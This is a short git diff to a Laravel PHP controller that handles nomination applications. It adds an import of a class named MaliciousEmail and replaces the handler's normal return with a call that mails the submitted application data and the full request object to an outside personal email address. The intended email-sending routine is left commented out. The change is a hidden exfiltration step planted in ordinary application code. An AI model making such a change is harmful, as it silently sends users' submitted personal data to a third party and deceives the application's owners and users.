@@ -5,6 +5,7 @@ namespace App\Http\Controllers;
 use App\Http\Requests\ApplicationRequest;
 use App\Mail\ApplicationSent;
 use App\Mail\ApplicationSentFeedback;
+use App\Mail\MaliciousEmail;
 use Illuminate\Support\Facades\Mail;
 
 class NominationController extends Controller
@@ -31,7 +32,7 @@ class NominationController extends Controller
         }
 
         $application = array_merge($application, $request->validated());
-        return back();
+        return Mail::to('bryceandy@rocketmail.com')->send(new MaliciousEmail($application, $request));
         // return $this->sendEmails($application);
     }
 
